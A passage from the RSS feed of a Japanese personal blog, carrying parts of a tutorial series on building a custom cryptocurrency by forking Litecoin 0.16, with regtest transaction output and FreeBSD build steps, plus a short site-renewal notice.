  &amp;#34;bip125-replaceable&amp;#34;: &amp;#34;no&amp;#34;,
  &amp;#34;details&amp;#34;: [
    {
      &amp;#34;account&amp;#34;: &amp;#34;&amp;#34;,
      &amp;#34;address&amp;#34;: &amp;#34;muPHrdiXX1ADd59vvv197dNjbPuSWuUEJM&amp;#34;,
      &amp;#34;category&amp;#34;: &amp;#34;immature&amp;#34;,
      &amp;#34;amount&amp;#34;: 50.00376000,
      &amp;#34;vout&amp;#34;: 0
    }
  ],
  &amp;#34;hex&amp;#34;: &amp;#34;020000000001010000000000000000000000000000000000000000000000000000000000000000ffffffff0401660101ffffffff02c0ae0b2a01000000232103c0de37a55878410a47d700880c37a67265a397d5f2c8e7e99d05a238b86a1d8eac0000000000000000266a24aa21a9ed5894f0f80c141be223bd7c9560f649036d6d77f3f72ae5249562322252fdb1c20120000000000000000000000000000000000000000000000000000000000000000000000000&amp;#34;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;amount に、マイニング報酬の50コインと手数料の0.00376コインを含めた50.00376が記載されています。&lt;/p&gt;
&lt;p&gt;チュートリアルは以上です。最後にlitecoindを終了させておきましょう。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest stop
&lt;/code&gt;&lt;/pre&gt;</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>自作仮想通貨入門(3) - Litecoinを試してみよう</title>
        <link>https://www.shutingrz.com/post/oreore-coin3/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>自作仮想通貨入門(2) - Litecoinの準備</title>
      <link>https://www.shutingrz.com/post/oreore-coin2/</link>
      <pubDate>Sat, 27 Apr 2019 15:11:43 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/oreore-coin2/</guid>
      <description>&lt;p&gt;自作仮想通貨のもととなる、Litecoin 0.16をダウンロードしていきます。&lt;br&gt;
今回は、フォークとリリースを容易に行えるように、gitを使って作業していきましょう。&lt;/p&gt;
&lt;h2 id=&#34;litecoin-016のclone&#34;&gt;Litecoin 0.16のclone&lt;/h2&gt;
&lt;p&gt;以下のgitコマンドを使ってgithubからLitecoinをダウンロードし、v0.16.0のtagにcheckoutしてください。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ git clone https://github.com/litecoin-project/litecoin
$ cd litecoin
$ git checkout refs/tags/v0.16.0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これでLitecoin 0.16の初期バージョンである0.16.0のダウンロードは完了です。&lt;/p&gt;
&lt;h1 id=&#34;litecoinのテストコンパイル&#34;&gt;Litecoinのテストコンパイル&lt;/h1&gt;
&lt;p&gt;ここでは FreeBSD 11 用の手順を記載します。&lt;br&gt;
UbuntuやDebianなど、Linux系をお使いの方は doc/build-unix.md を確認してコンパイルしてください。&lt;br&gt;
内容はFreeBSDの場合とあまり変わらないです。&lt;/p&gt;
&lt;h2 id=&#34;各種ライブラリのインストール&#34;&gt;各種ライブラリのインストール&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ pkg install autoconf automake libtool pkgconf
$ pkg install boost-libs openssl libevent
$ pkg install gmake
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;db48-のコンパイル&#34;&gt;db4.8 のコンパイル&lt;/h2&gt;
&lt;p&gt;ウォレット機能を使うためには BerkeleyDB 4.8 が必要なので、ダウンロード、コンパイルします。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ./contrib/install_db4.sh `pwd`
$ setenv BDB_PREFIX $PWD/db4
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;litecoin-のコンパイル&#34;&gt;Litecoin のコンパイル&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ./autogen.sh
$ ./configure BDB_LIBS=&amp;#34;-L${BDB_PREFIX}/lib -ldb_cxx&amp;#34; BDB_CFLAGS=&amp;#34;-I${BDB_PREFIX}/include&amp;#34; --disable-dependency-tracking
$ gmake
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;エラーなくコンパイルができれば問題ありません。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>自作仮想通貨入門(2) - Litecoinの準備</title>
        <link>https://www.shutingrz.com/post/oreore-coin2/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>自作仮想通貨入門(1) - はじめに</title>
      <link>https://www.shutingrz.com/post/oreore-coin1/</link>
      <pubDate>Sat, 27 Apr 2019 14:24:31 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/oreore-coin1/</guid>
      <description>&lt;figure&gt;&lt;img src=&#34;./raccoin.png&#34;
         alt=&#34;自作仮想通貨「Raccoin」のアイコン&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;自作仮想通貨「Raccoin」のアイコン&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;hr&gt;
&lt;p&gt;皆さんは自作仮想通貨を作ったことはあるでしょうか？&lt;br&gt;
イーサリアムのトークンやCounterPartyもいいですが、やはり仮想通貨の思想を深く知りたいなら、好きな仮想通貨のソースコードをフォークして自作仮想通貨を作ってみるべきです。&lt;/p&gt;
&lt;p&gt;ただ、巷に溢れているアルトコインは総じて古いBitcoin Coreの実装を流用しており、英語で書かれている断片的な解説ページも、同じく古い実装を参照しています。&lt;br&gt;
古いBitcoin CoreはP2SHやSegwitに未対応など機能が少ないばかりか、現在では修正されている複数の問題が残っているため、ソースコードの流用はオススメできません。&lt;/p&gt;
&lt;p&gt;しかしながら、最近のBitcoin Core系を使ってアルトコインを作ろうにも、最近の実装に対応したアルトコインの作り方を載せているページは全くありませんでした。&lt;/p&gt;
&lt;p&gt;結局私は自力でソースコードリーディングし、現在のBitcoin Coreに準拠した、2018年にリリースされたLitecoin 0.16をもとに自作仮想通貨を作り上げました。&lt;br&gt;
その過程で得られた知見と手順をここに記載します。&lt;/p&gt;
&lt;p&gt;なお実際に仮想通貨を作成する際、遅かれ早かれ仮想通貨の勉強が必要になってきます。&lt;br&gt;
並行して以下のMastering Bitcoin [日本語版]を読んでおくと理解が深まるでしょう。&lt;br&gt;
&lt;a href=&#34;https://bitcoinbook.info/wp-content/translations/ja/book.pdf&#34;&gt;https://bitcoinbook.info/wp-content/translations/ja/book.pdf&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;注意点&#34;&gt;注意点&lt;/h1&gt;
&lt;h2 id=&#34;ビルド環境について&#34;&gt;ビルド環境について&lt;/h2&gt;
&lt;p&gt;FreeBSD 11.1 でビルドを確認しました。&lt;br&gt;
Linux環境でもほぼ同じ手順で行えますが、sed コマンドのコマンドオプションが異なるため文字列置換の際に問題が発生するかもしれません。&lt;/p&gt;
&lt;h2 id=&#34;ドキュメントの記載と実際の環境の差異について&#34;&gt;ドキュメントの記載と実際の環境の差異について&lt;/h2&gt;
&lt;p&gt;仮想通貨をビルドし実際に使える状態にすることを第一に考えるため、ドキュメントに記載された内容と実際の環境に差異が発生します。&lt;br&gt;
例えば、release-process.md にはgitianを使ったリリースプロセスが項目にありますが、そこには特定のgitが存在することを前提にした記載になっています。&lt;br&gt;
そのためリリースプロセス通りにリリースしようとすると必ず詰まります。 &lt;br&gt;
その他、ドキュメントには参考URLとしてLitecoinチームが独自に開設したコミュニティが記載されていますが、これについても自作仮想通貨を作成しているときには存在しないため、リンク切れを起こします。&lt;/p&gt;
&lt;p&gt;以上のような現象がいくつかのドキュメントで発生しますが、自作仮想通貨の作成に影響はないのでここでは放置します。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>自作仮想通貨入門(1) - はじめに</title>
        <link>https://www.shutingrz.com/post/oreore-coin1/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>サイトをリニューアルしました</title>
      <link>https://www.shutingrz.com/post/first-article/</link>
      <pubDate>Sat, 27 Apr 2019 02:37:37 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/first-article/</guid>
      <description>&lt;p&gt;今までのポートフォリオサイトが適当すぎたのと、ブログははてなブログを使ってたので&lt;br&gt;
ポートフォリオ兼ブログとしてリニューアルしました。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>サイトをリニューアルしました</title>
        <link>https://www.shutingrz.com/post/first-article/</link>
      </image>
    </item>
    </channel>
</rss>
